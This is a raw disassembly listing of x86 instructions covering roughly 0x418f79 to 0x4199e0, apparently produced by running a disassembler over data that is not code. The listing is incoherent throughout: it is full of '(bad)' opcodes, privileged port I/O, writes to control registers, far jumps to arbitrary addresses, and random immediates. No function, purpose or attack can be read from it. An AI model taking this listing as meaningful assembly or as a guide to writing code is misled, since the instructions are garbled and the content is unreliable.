  418f79:	adc    al,0xcd
  418f7b:	arpl   WORD PTR [edi+0x7f04113c],di
  418f81:	gs aam 0xca
  418f84:	mov    ds:0x91f15b0c,al
  418f89:	or     BYTE PTR [edx+ebx*8],bh
  418f8c:	jb     0x418fba
  418f8e:	xor    bl,ah
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x67eaf1a7]
  419001:	mov    bh,0x52
  419003:	mov    eax,ds:0x108b4
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	adc    BYTE PTR [edi+0x5e],dl
  41900f:	test   BYTE PTR [edi+0x6cc60341],bl
  419015:	in     al,0xd9
  419017:	mov    bh,0x1d
  419019:	ins    DWORD PTR es:[edi],dx
  41901a:	test   esp,ebp
  41901c:	loope  0x419017
  41901e:	push   ds
  41901f:	push   ebp
  419020:	xor    al,0x59
  419022:	call   FWORD PTR [ecx+0x15]
  419025:	shl    DWORD PTR [edx-0x74ea0876],0x39
  41902c:	push   0xffffffc4
  41902e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41902f:	adc    eax,0xab5d9e18
  419034:	or     eax,0x376faff0
  419039:	imul   ebp,esi,0xa2a9ff57
  41903f:	pop    ecx
  419040:	adc    edi,eax
  419042:	aaa    
  419043:	xchg   DWORD PTR [edx+0x30e3f7f5],ebp
  419049:	or     edi,ebx
  41904b:	adc    DWORD PTR ds:0xb006746f,ebx
  419051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419052:	jne    0x4190cd
  419054:	inc    edi
  419055:	leave  
  419056:	rol    BYTE PTR [ebp+edi*2-0x548c1373],cl
  41905d:	mov    esi,0xc170f8bb
  419062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419063:	jl     0x4190aa
  419065:	xor    ecx,edi
  419067:	jl     0x418fff
  419069:	jns    0x418ff5
  41906b:	cmp    al,0x47
  41906d:	and    DWORD PTR [ecx-0x2807bb4b],ecx
  419073:	addr16 retf 
  419075:	push   ecx
  419076:	out    dx,eax
  419077:	addr16 add eax,0x3d15dc9f
  41907d:	jbe    0x419040
  41907f:	clc    
  419080:	(bad)  
  419081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419082:	ins    BYTE PTR es:[edi],dx
  419083:	add    BYTE PTR [eax],0xaa
  419086:	(bad)  
  419087:	xlat   BYTE PTR ds:[ebx]
  419088:	mov    al,ds:0x515d4882
  41908d:	shr    DWORD PTR [eax+eax*1],0xbf
  419091:	je     0x419055
  419093:	jge    0x419078
  419095:	jle    0x419044
  419097:	cld    
  419098:	rcr    DWORD PTR [ecx+eax*8-0x19],0x4d
  41909d:	imul   ecx,DWORD PTR cs:[ebx+0x3cb14304],0xffffff86
  4190a5:	and    eax,0xaa4a002f
  4190aa:	icebp  
  4190ab:	repz out 0xda,eax
  4190ae:	lods   eax,DWORD PTR ds:[esi]
  4190af:	call   0xda50ec87
  4190b4:	push   ss
  4190b5:	xor    eax,0xe7a5a867
  4190ba:	mov    dh,0x9f
  4190bc:	jne    0x419110
  4190be:	mov    esi,0xdcfb330a
  4190c3:	js     0x4190db
  4190c5:	push   ecx
  4190c6:	(bad)  
  4190c7:	mov    ebx,0x86233025
  4190cc:	stc    
  4190cd:	outs   dx,BYTE PTR ds:[esi]
  4190ce:	cmp    BYTE PTR [ecx-0x14f6e158],cl
  4190d4:	push   esi
  4190d5:	xor    esi,DWORD PTR [esi]
  4190d7:	fistp  QWORD PTR [edx+0x71]
  4190da:	push   eax
  4190db:	rcl    edx,0xe0
  4190de:	push   cs
  4190df:	int3   
  4190e0:	popa   
  4190e1:	ret    0xcfad
  4190e4:	add    eax,0xc240400c
  4190e9:	jnp    0x419109
  4190eb:	xor    eax,0x42fa6acd
  4190f0:	or     BYTE PTR [esi],al
  4190f2:	dec    esi
  4190f3:	jmp    FWORD PTR [ecx-0x36ff8b98]
  4190f9:	ds enter 0xb158,0x2b
  4190fe:	push   0xcd974286
  419103:	(bad)  
  419104:	lods   eax,DWORD PTR ds:[esi]
  419105:	push   ebp
  419106:	arpl   WORD PTR [ebx],bx
  419108:	push   0x60a2254a
  41910d:	imul   esi,DWORD PTR [edi+edx*2],0x0
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     al,BYTE PTR [edi]
  419181:	mov    ch,0x77
  419183:	pop    es
  419184:	mov    eax,0x4000109
  419189:	add    DWORD PTR [eax],eax
  41918b:	add    BYTE PTR [ecx],al
  41918d:	adc    BYTE PTR [ebp+0x16a0149d],ch
  419193:	cmp    dh,BYTE PTR ds:0x7ef97d7d
  419199:	in     eax,0xf0
  41919b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41919c:	out    0x60,eax
  41919e:	cmp    eax,DWORD PTR [ebp+0x7696a091]
  4191a4:	cmp    DWORD PTR [ebp+0x43],esp
  4191a7:	outs   dx,BYTE PTR ds:[esi]
  4191a8:	mul    BYTE PTR [esi-0x7d]
  4191ab:	pop    ebp
  4191ac:	and    al,0xfa
  4191ae:	cld    
  4191af:	jmp    0x41920f
  4191b1:	and    eax,0x42d6f4c
  4191b6:	mov    eax,ds:0xd7b1a6a0
  4191bb:	int    0xe9
  4191bd:	sub    edx,0x916f820d
  4191c3:	lahf   
  4191c4:	mul    BYTE PTR [ebx+0x2fe5bb68]
  4191ca:	push   ecx
  4191cb:	bound  ecx,QWORD PTR [edx]
  4191cd:	sbb    DWORD PTR [edi],ebx
  4191cf:	and    ecx,0x37841509
  4191d5:	jg     0x41919e
  4191d7:	call   0xcd113371
  4191dc:	mov    ch,0xb8
  4191de:	push   ebp
  4191df:	mov    al,0x54
  4191e1:	loop   0x4191eb
  4191e3:	add    esi,DWORD PTR [ebx+0x54]
  4191e6:	pop    ebx
  4191e7:	mov    al,ds:0x836e7e2b
  4191ec:	sbb    edx,DWORD PTR [esi-0xc94879f]
  4191f2:	pop    ds
  4191f3:	mov    dh,0x1a
  4191f5:	pop    eax
  4191f6:	mov    eax,0xf882cf42
  4191fb:	clc    
  4191fc:	into   
  4191fd:	dec    ecx
  4191fe:	mov    bh,0xcb
  419200:	jo     0x41922e
  419202:	(bad)  
  419203:	mov    esi,0x7b87ff3c
  419208:	(bad)  
  419209:	into   
  41920a:	sbb    bl,bl
  41920c:	jmp    0x3ff1d109
  419211:	dec    BYTE PTR [edx-0x37]
  419214:	inc    edx
  419215:	push   ebp
  419216:	ds inc ecx
  419218:	inc    ebp
  419219:	pop    ebp
  41921a:	sahf   
  41921b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921c:	push   ss
  41921d:	sub    ch,bl
  41921f:	dec    ecx
  419220:	out    dx,eax
  419221:	arpl   si,cx
  419223:	xchg   esi,eax
  419224:	sbb    BYTE PTR [ecx-0x1f],dl
  419227:	xchg   esi,eax
  419228:	mov    ch,0x32
  41922a:	sti    
  41922b:	leave  
  41922c:	inc    edx
  41922d:	in     eax,dx
  41922e:	xor    al,BYTE PTR [edi+0x22612b07]
  419234:	and    BYTE PTR [ebp-0x63],ah
  419237:	jmp    0x419290
  419239:	imul   eax,DWORD PTR [esi],0x65
  41923c:	jne    0x4191d2
  41923e:	mov    ah,0xa5
  419240:	(bad)  
  419241:	(bad)  
  419242:	cmc    
  419243:	inc    esp
  419244:	call   0xcc9d4993
  419249:	pop    es
  41924a:	jbe    0x4192c8
  41924c:	push   ds
  41924d:	dec    eax
  41924e:	adc    al,0x6a
  419250:	sbb    eax,0xf68836fd
  419255:	add    al,0xd3
  419257:	sbb    BYTE PTR [ecx+0x2afa061c],dh
  41925d:	mov    cr4,esp
  419260:	jp     0x419226
  419262:	fs sti 
  419264:	out    dx,eax
  419265:	mov    ecx,0x6a521cde
  41926a:	add    edx,DWORD PTR [esp+esi*1]
  41926d:	out    0x65,al
  41926f:	dec    esi
  419270:	dec    ecx
  419271:	push   ebx
  419272:	jno    0x4192d3
  419274:	stos   DWORD PTR es:[edi],eax
  419275:	or     ebp,edx
  419277:	rol    DWORD PTR [edi+0x669ae8b],1
  41927d:	push   0x91dcc0f3
  419282:	jge    0x4192a7
  419284:	sbb    al,0xb6
  419286:	xor    eax,0xf0ff01f1
  41928b:	clc    
  41928c:	jns    0x41930b
  41928e:	pop    ss
  41928f:	cld    
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	or     al,0xf0
  419302:	in     eax,dx
  419303:	mov    esi,0x10abc
  419308:	add    al,0x1
  41930a:	add    BYTE PTR [eax],al
  41930c:	nop
  41930d:	lahf   
  41930e:	cmp    bl,BYTE PTR [ebx-0x31]
  419311:	xchg   esi,eax
  419312:	(bad)  
  419314:	pop    es
  419315:	cli    
  419316:	stos   BYTE PTR es:[edi],al
  419317:	ins    DWORD PTR es:[edi],dx
  419318:	je     0x4192cf
  41931a:	fstp   TBYTE PTR ds:0xe5153899
  419320:	cmp    al,0xef
  419322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419323:	mov    eax,ds:0x5a3c6ec9
  419329:	mov    cl,0xea
  41932b:	(bad)  
  41932d:	adc    ah,ch
  41932f:	lea    edx,[ebx-0x38662e1d]
  419335:	inc    esi
  419336:	cmp    BYTE PTR [eax+ebx*4+0x66],dh
  41933a:	inc    esp
  41933b:	mov    bh,0x54
  41933d:	adc    ebx,esi
  41933f:	test   al,0x22
  419341:	lahf   
  419342:	jb     0x4193a2
  419344:	pop    eax
  419345:	mov    edx,0x95154ffc
  41934a:	pop    es
  41934b:	xor    dl,BYTE PTR [ebp+0x9]
  41934e:	ds cmp eax,0xafb86ad5
  419354:	test   BYTE PTR [eax-0x3d227c0e],0xff
  41935b:	jns    0x419328
  41935d:	dec    edx
  41935e:	and    eax,0xc51365ca
  419363:	test   BYTE PTR [edx],al
  419365:	int3   
  419366:	retf   0x4515
  419369:	pop    edx
  41936a:	cdq    
  41936b:	xor    BYTE PTR [eax],al
  41936d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41936e:	push   0x9c506c36
  419373:	rcl    BYTE PTR [ecx+0x26f8ef5b],0xd8
  41937a:	cs jne 0x4193e4
  41937d:	cmp    BYTE PTR [ebx+0xe6db9c8],dh
  419383:	aad    0x27
  419385:	icebp  
  419386:	xor    ah,0xec
  419389:	pop    ebx
  41938a:	(bad)
  41938d:	jg     0x41939b
  41938f:	das    
  419390:	jecxz  0x4193e6
  419392:	pop    edi
  419393:	sbb    al,0x8f
  419395:	out    0x6c,eax
  419397:	push   esi
  419398:	mov    ds:0x18371174,eax
  41939d:	dec    ebx
  41939e:	sub    WORD PTR [edi],bp
  4193a1:	mov    esi,0xc6d9641b
  4193a6:	sub    eax,0x8669e9c4
  4193ab:	jl     0x419372
  4193ad:	sbb    DWORD PTR [eax-0x7137c084],eax
  4193b3:	enter  0xa2e8,0xc7
  4193b7:	mov    BYTE PTR [ebx],0x50
  4193ba:	mov    ch,0xbf
  4193bc:	lods   al,BYTE PTR ds:[esi]
  4193bd:	(bad)  
  4193be:	xchg   edx,eax
  4193bf:	bound  edx,QWORD PTR [ecx+0x50822a95]
  4193c5:	mov    bl,0xed
  4193c7:	and    bh,dh
  4193c9:	nop
  4193ca:	cmp    BYTE PTR [edi-0x515103cb],0xd7
  4193d1:	pop    ebx
  4193d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193d3:	xor    DWORD PTR [edx],0xffffffd1
  4193d6:	xchg   ebx,eax
  4193d7:	lea    edx,[edi]
  4193d9:	and    BYTE PTR [edx+esi*2],ah
  4193dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193dd:	xchg   esp,eax
  4193de:	iret   
  4193df:	outs   dx,DWORD PTR ds:[esi]
  4193e0:	inc    edx
  4193e1:	fwait
  4193e2:	and    edi,ebp
  4193e4:	jb     0x41936f
  4193e6:	push   esi
  4193e7:	xor    eax,0xd8c4e096
  4193ec:	or     BYTE PTR [esi],al
  4193ee:	popa   
  4193ef:	pop    edx
  4193f0:	dec    edi
  4193f1:	mov    al,0x79
  4193f3:	adc    DWORD PTR [edx],edx
  4193f5:	adc    esi,DWORD PTR [ecx+0x739c5ce]
  4193fb:	sahf   
  4193fc:	add    bh,BYTE PTR [ecx-0x51]
  4193ff:	into   
  419400:	jg     0x4193b7
  419402:	rol    DWORD PTR [edx],0xe4
  419405:	and    ebx,DWORD PTR cs:[ebx+ebp*4]
  419409:	cmp    esi,DWORD PTR [edi]
  41940b:	sbb    esi,esp
  41940d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41940e:	dec    edx
  41940f:	add    al,0x0
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	dec    esp
  419481:	cdq    
  419482:	frstor [edx+0x10bc0]
  419488:	add    al,0x1
  41948a:	add    BYTE PTR [eax],al
  41948c:	adc    eax,edi
  41948e:	inc    edx
  41948f:	mov    ds:0x3f949651,al
  419494:	xlat   BYTE PTR ds:[ebx]
  419495:	sub    eax,0xf25ca46a
  41949a:	cmc    
  41949b:	mov    eax,ds:0xacfc6c70
  4194a0:	pop    es
  4194a1:	inc    eax
  4194a2:	xor    ebx,DWORD PTR [edi*1-0x34f1649a]
  4194a9:	jmp    0x4194d0
  4194ab:	inc    esi
  4194ac:	jnp    0x4194ad
  4194ae:	leave  
  4194af:	push   edx
  4194b0:	mov    al,ds:0x70d7c11
  4194b5:	sbb    BYTE PTR [edi+0x16fb0d72],bl
  4194bb:	out    0x83,al
  4194bd:	jae    0x4194ea
  4194bf:	push   esi
  4194c0:	mov    bh,0x56
  4194c2:	loope  0x4194bb
  4194c4:	test   dl,al
  4194c6:	inc    ecx
  4194c7:	pop    ebp
  4194c8:	pop    ss
  4194c9:	pop    es
  4194ca:	xchg   ecx,eax
  4194cb:	add    al,0xf1
  4194cd:	lock mov cl,0x39
  4194d0:	add    eax,edx
  4194d2:	sub    DWORD PTR [ebx+0x26],ebx
  4194d5:	mov    al,0x36
  4194d7:	int3   
  4194d8:	outs   dx,DWORD PTR ds:[esi]
  4194d9:	outs   dx,DWORD PTR ds:[esi]
  4194da:	dec    edx
  4194db:	adc    dh,BYTE PTR [ebx+ecx*8]
  4194de:	dec    ebx
  4194df:	gs push ss
  4194e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194e2:	ja     0x419530
  4194e4:	clc    
  4194e5:	fidiv  WORD PTR cs:[edi-0x1f]
  4194e9:	sti    
  4194ea:	(bad)  
  4194eb:	enter  0xb4f1,0x25
  4194ef:	fimul  DWORD PTR [edi+edi*1]
  4194f2:	hlt    
  4194f3:	or     al,0x97
  4194f5:	mov    bh,0xa1
  4194f7:	inc    esp
  4194f8:	aad    0x90
  4194fa:	sub    al,0x26
  4194fc:	adc    eax,0xe0897d59
  419501:	(bad)
  419504:	imul   esi,DWORD PTR [eax+0x6fd185c0],0x848b8c7d
  41950e:	or     eax,0xb9ffb947
  419513:	je     0x41957c
  419515:	retf   0x7aaf
  419518:	pop    edi
  419519:	shl    DWORD PTR [ebp-0x13e760ad],cl
  41951f:	pop    ds
  419520:	or     BYTE PTR [ebp-0x5fe0a22d],ah
  419526:	lds    eax,FWORD PTR [edx+0x38]
  419529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41952a:	and    bh,bl
  41952c:	in     al,dx
  41952d:	inc    ebx
  41952e:	jo     0x4194ff
  419530:	fnstenv [eax+eax*2-0x3b]
  419534:	cmp    al,BYTE PTR [edi+0x6c7c4b99]
  41953a:	lock mov ss,WORD PTR [ebx]
  41953d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41953e:	(bad)  
  41953f:	call   0xf915c43e
  419544:	into   
  419545:	js     0x41953e
  419547:	jecxz  0x419515
  419549:	push   ebp
  41954a:	sahf   
  41954b:	push   ebp
  41954c:	enter  0x4b4c,0x8d
  419550:	pop    ebp
  419551:	cld    
  419552:	add    esi,DWORD PTR [edi]
  419554:	shl    BYTE PTR [ebp+0x5c27a12c],0x6f
  41955b:	push   es
  41955c:	fdiv   QWORD PTR [ebp+0x6f]
  41955f:	mov    esp,0xf0f57a3
  419564:	fimul  WORD PTR ds:0x2a6bc4e2
  41956a:	and    edx,DWORD PTR [esi-0x79b75033]
  419570:	pop    esp
  419571:	into   
  419572:	test   BYTE PTR [ebp-0x78],bh
  419575:	ror    bh,cl
  419577:	(bad)  
  419578:	push   esi
  419579:	push   eax
  41957a:	inc    eax
  41957b:	adc    ebx,DWORD PTR ds:0xfc6a5b1c
  419581:	or     bh,al
  419583:	mov    BYTE PTR [edi],dl
  419585:	push   ebp
  419586:	push   es
  419587:	push   esi
  419588:	or     BYTE PTR [eax+0x5d],dl
  41958b:	int    0xef
  41958d:	jle    0x419542
  41958f:	add    BYTE PTR gs:[eax],al
	...
  4195f2:	add    BYTE PTR [eax],al
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	mov    fs,ebp
  419602:	test   ah,cl
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	retf   
  41960d:	cdq    
  41960e:	lahf   
  41960f:	push   es
  419610:	clc    
  419611:	and    DWORD PTR [ebp+0x2d],edx
  419614:	add    eax,0x4af6fa42
  419619:	push   ecx
  41961a:	(bad)  
  41961d:	jecxz  0x4195d6
  41961f:	pop    ss
  419620:	xlat   BYTE PTR ds:[ebx]
  419621:	rcl    BYTE PTR [ebx],1
  419623:	push   esp
  419624:	fild   WORD PTR [edx+0xd7165c4]
  41962a:	pop    ebp
  41962b:	fidiv  DWORD PTR [eax]
  41962d:	xor    DWORD PTR [ebp+0x16b9f4f],esi
  419633:	cwde   
  419634:	pop    ebx
  419635:	jmp    0x77859ffd
  41963a:	imul   ebp,DWORD PTR [ebx-0x18094ca8],0x6c
  419641:	and    BYTE PTR [ecx+esi*8],0x64
  419645:	dec    esp
  419646:	fild   QWORD PTR [esi-0x647f6de1]
  41964c:	xchg   esp,eax
  41964d:	xlat   BYTE PTR ds:[ebx]
  41964e:	std    
  41964f:	jp     0x419614
  419651:	pop    es
  419652:	or     ah,BYTE PTR [ebx-0x26]
  419655:	aaa    
  419656:	sub    al,0x14
  419658:	or     eax,eax
  41965a:	and    dh,al
  41965c:	fadd   st(0),st
  41965e:	test   BYTE PTR [eax+0x1528f8f],dl
  419664:	imul   esi,DWORD PTR [edx-0x4],0x5fe5711e
  41966b:	push   ss
  41966c:	aad    0xfc
  41966e:	int    0xa2
  419670:	and    BYTE PTR [esp+edx*4-0x12],0x28
  419675:	arpl   WORD PTR [ecx-0xadb273b],cx
  41967b:	sub    ecx,DWORD PTR [esi+0x434aa370]
  419681:	stos   BYTE PTR es:[edi],al
  419682:	push   esi
  419683:	mov    ds:0xd3d12e2d,al
  419688:	add    al,0xfd
  41968a:	mov    al,0xf
  41968c:	cmp    bh,BYTE PTR [ecx+0x3073465f]
  419692:	add    eax,0xf801a867
  419697:	mov    esi,0xff49b02e
  41969c:	leave  
  41969d:	test   al,0xe1
  41969f:	cmp    ch,dl
  4196a1:	adc    eax,0xd6b63e93
  4196a6:	ja     0x4196ce
  4196a8:	jnp    0x4196a4
  4196aa:	js     0x4196a8
  4196ac:	dec    ebp
  4196ad:	mov    cs,WORD PTR [edx-0x402f4d8e]
  4196b3:	sub    BYTE PTR [ecx+esi*2+0x19],dl
  4196b7:	push   edi
  4196b8:	pop    ebx
  4196b9:	js     0x4196a9
  4196bb:	ds in  eax,0xd3
  4196be:	(bad)  
  4196bf:	push   ebx
  4196c0:	pop    esi
  4196c1:	xor    BYTE PTR [ecx+0x73],al
  4196c4:	mov    eax,ds:0xb9a6e091
  4196c9:	push   ss
  4196ca:	inc    ebp
  4196cb:	and    ecx,DWORD PTR [edx]
  4196cd:	xchg   ebx,eax
  4196ce:	mov    ah,0xb5
  4196d0:	mov    esp,DWORD PTR [edi+0xb63dddc]
  4196d6:	sub    BYTE PTR [esi+0x27],bl
  4196d9:	out    dx,al
  4196da:	pushf  
  4196db:	(bad)  
  4196dc:	loope  0x41970f
  4196de:	div    DWORD PTR [eax-0x47]
  4196e1:	jg     0x4196ee
  4196e3:	pop    edx
  4196e4:	std    
  4196e5:	pop    ss
  4196e6:	inc    ebp
  4196e7:	lahf   
  4196e8:	(bad)  
  4196ea:	imul   ebx,DWORD PTR gs:[ecx-0x3],0x4520dd97
  4196f2:	jbe    0x41974f
  4196f4:	push   cs
  4196f5:	daa    
  4196f6:	je     0x4196c6
  4196f8:	lock pop ss
  4196fa:	pop    es
  4196fb:	or     edx,edx
  4196fd:	cli    
  4196fe:	or     al,0x27
  419700:	fs nop
  419702:	xlat   BYTE PTR ds:[ebx]
  419703:	xor    bl,BYTE PTR [esi]
  419705:	and    ebp,DWORD PTR [edx+edx*2+0x26a43a4f]
  41970c:	mov    ebp,0x3e827b
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x318dd0ae
  419781:	mov    ds:0xdc854b8,al
  419786:	add    DWORD PTR [eax],eax
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	cld    
  41978d:	ds pop ecx
  41978f:	jge    0x4197f5
  419791:	ds adc cl,ch
  419794:	and    dl,BYTE PTR [edi]
  419796:	sar    BYTE PTR [edi+0x35a67404],0x9b
  41979d:	or     eax,0x677f6bc6
  4197a2:	lock mov bl,0xe2
  4197a5:	or     eax,ebp
  4197a7:	push   ebx
  4197a8:	rol    dl,0x28
  4197ab:	push   es
  4197ac:	mov    ah,0x95
  4197ae:	and    eax,0x19876670
  4197b3:	sbb    ecx,ebx
  4197b5:	lods   eax,DWORD PTR ds:[esi]
  4197b6:	inc    esp
  4197b7:	stc    
  4197b8:	or     DWORD PTR [ebp-0x862c531],0x86df62c8
  4197c2:	je     0x419814
  4197c4:	shr    DWORD PTR [ebx-0x766bf823],1
  4197ca:	push   ss
  4197cb:	int3   
  4197cc:	outs   dx,BYTE PTR ds:[esi]
  4197cd:	ja     0x4197b1
  4197cf:	rcr    al,1
  4197d1:	sahf   
  4197d2:	cmp    edx,eax
  4197d4:	push   ebp
  4197d5:	aaa    
  4197d6:	xchg   DWORD PTR [esi-0x26],edi
  4197d9:	(bad)  
  4197da:	mov    esi,0x6f04293b
  4197df:	std    
  4197e0:	lock in eax,0x4b
  4197e3:	loope  0x4197d7
  4197e5:	rcl    DWORD PTR [ebp+0x68b39cc9],1
  4197eb:	add    ah,BYTE PTR [eax]
  4197ed:	fwait
  4197ee:	(bad)  
  4197ef:	jmp    0xbc43:0xd2c1acae
  4197f6:	dec    ebx
  4197f7:	mov    dh,0xdf
  4197f9:	outs   dx,DWORD PTR ds:[esi]
  4197fa:	cmc    
  4197fb:	cmp    eax,0x7108c50f
  419800:	push   ss
  419801:	add    ebp,DWORD PTR [edx]
  419803:	cmp    al,0x8a
  419805:	dec    ecx
  419806:	fldenv [esi]
  419808:	and    eax,edi
  41980a:	xor    eax,0x1327ca97
  41980f:	add    ecx,DWORD PTR [ebx-0x42]
  419812:	push   ecx
  419813:	inc    edx
  419814:	bound  esi,QWORD PTR [ebx]
  419816:	mov    ds:0x5f8e0109,eax
  41981b:	int    0xd9
  41981d:	adc    ebx,DWORD PTR [edx+0x600a21ac]
  419823:	std    
  419824:	jp     0x419842
  419826:	or     eax,0xd0a07fc
  41982b:	mov    edx,0xf7a1676e
  419830:	push   edx
  419831:	loopne 0x4197ee
  419833:	test   eax,0x5f8e7c04
  419838:	fmul   DWORD PTR [esi+0x33883a1d]
  41983e:	pop    eax
  41983f:	nop
  419840:	xchg   DWORD PTR [ebp-0x31],ebx
  419843:	and    al,0x77
  419845:	lahf   
  419846:	mov    ah,0x51
  419848:	mov    fs,esp
  41984a:	nop
  41984b:	adc    edx,DWORD PTR [esp+ebx*2+0x54]
  41984f:	lods   al,BYTE PTR ds:[esi]
  419850:	push   edx
  419851:	dec    esi
  419852:	jbe    0x4197df
  419854:	push   esi
  419855:	loopne 0x41984f
  419857:	mov    dl,0xe0
  419859:	xchg   DWORD PTR [eax-0x367ce4dd],ecx
  41985f:	xchg   edi,eax
  419860:	scas   eax,DWORD PTR es:[edi]
  419861:	ins    BYTE PTR es:[edi],dx
  419862:	dec    ebp
  419863:	lahf   
  419864:	lahf   
  419865:	dec    DWORD PTR [eax+0xa]
  419868:	ror    dl,cl
  41986a:	pop    esi
  41986b:	adc    edi,edi
  41986d:	or     al,0x3f
  41986f:	mov    al,0x60
  419871:	retf   0x731b
  419874:	pop    ss
  419875:	dec    BYTE PTR [ecx+esi*2+0x4fd33862]
  41987c:	aas    
  41987d:	bnd jae 0x41981a
  419880:	ja     0x41987d
  419882:	push   edx
  419883:	or     bl,BYTE PTR [ebp-0x77]
  419886:	pushf  
  419887:	jge    0x419892
  419889:	call   FWORD PTR [ebp+eax*1-0x12]
  41988d:	scas   eax,DWORD PTR es:[edi]
  41988e:	or     cl,BYTE PTR [ebx+0x0]
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fst    QWORD PTR [edx-0x1e]
  419902:	push   edx
  419903:	adc    esp,ecx
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	bound  ebp,QWORD PTR [edx]
  41990e:	outs   dx,BYTE PTR ds:[esi]
  41990f:	mov    bh,0x52
  419911:	std    
  419912:	(bad)  
  419913:	stc    
  419914:	mov    bl,0xb9
  419916:	xchg   esi,eax
  419917:	add    cl,BYTE PTR [ebx]
  419919:	sub    BYTE PTR [esi-0x49],ah
  41991c:	pop    ds
  41991d:	or     ecx,DWORD PTR [ebx]
  41991f:	inc    ebx
  419920:	pop    ebp
  419921:	push   cs
  419922:	xor    al,0xbe
  419924:	fldcw  WORD PTR [edx]
  419926:	call   0x7e77080d
  41992b:	mov    ebx,0x55941e99
  419930:	into   
  419931:	cwde   
  419932:	pop    ebp
  419933:	sub    ah,BYTE PTR [ecx+0x2d]
  419936:	dec    esi
  419937:	pop    ecx
  419938:	mov    ch,BYTE PTR [esi]
  41993a:	xor    dl,ch
  41993c:	ror    BYTE PTR [esp+ebp*8+0x12e48be9],0x2
  419944:	push   ds
  419945:	cmp    bl,BYTE PTR [esp+ebx*1]
  419948:	icebp  
  419949:	mov    ah,0xd7
  41994b:	mov    ebp,0xee67656b
  419950:	push   esi
  419951:	or     eax,edi
  419953:	lea    esp,[ecx+0x610b0e1e]
  419959:	mov    cl,0x6
  41995b:	push   cs
  41995c:	xor    al,0x89
  41995e:	ja     0x4199dc
  419960:	jl     0x419977
  419962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419963:	add    eax,0xe1492d47
  419968:	and    eax,0x2ff2fc6e
  41996d:	je     0x4199e5
  41996f:	or     BYTE PTR [eax+0x41118ce3],0x60
  419976:	popa   
  419977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419978:	sar    BYTE PTR [esi-0x646ab3ab],cl
  41997e:	xchg   BYTE PTR [edx+0x25e60f18],ch
  419984:	mov    esp,0xe13ca86f
  419989:	push   ss
  41998a:	retf   
  41998b:	mov    dh,0x3b
  41998d:	inc    eax
  41998e:	dec    ebp
  41998f:	or     eax,0x30ecbbb3
  419994:	fdiv   DWORD PTR [ecx+0x6]
  419997:	mov    DWORD PTR [esi],eax
  419999:	fdiv   QWORD PTR [bp+di-0x8]
  41999d:	jecxz  0x419a10
  41999f:	push   ebp
  4199a0:	(bad)  
  4199a1:	fwait
  4199a2:	clc    
  4199a3:	outs   dx,DWORD PTR ds:[esi]
  4199a4:	push   ebp
  4199a5:	or     bl,al
  4199a7:	xchg   DWORD PTR [edx+ebx*2-0x7d0ededa],esi
  4199ae:	int3   
  4199af:	inc    ebp
  4199b0:	cmp    al,0xeb
  4199b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199b3:	adc    cl,bh
  4199b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b6:	cmp    ebp,DWORD PTR [ebx+ecx*8]
  4199b9:	retf   
  4199ba:	inc    ecx
  4199bb:	push   cs
  4199bc:	hlt    
  4199bd:	(bad)  
  4199be:	push   0xe05174d0
  4199c3:	jmp    0x41995f
  4199c5:	adc    eax,DWORD PTR [edi]
  4199c7:	arpl   WORD PTR [eax+0x39],sp
  4199ca:	mov    dh,0xc6
  4199cc:	stc    
  4199cd:	dec    ecx
  4199ce:	mov    bh,0xb1
  4199d0:	and    al,cl
  4199d2:	repnz icebp 
  4199d4:	push   eax
  4199d5:	mov    ch,0x25
  4199d7:	sub    DWORD PTR [eax-0x6b18de6f],eax
  4199dd:	sub    al,0xe3
  4199df:	cld    
  4199e0:	cmp    dl,al
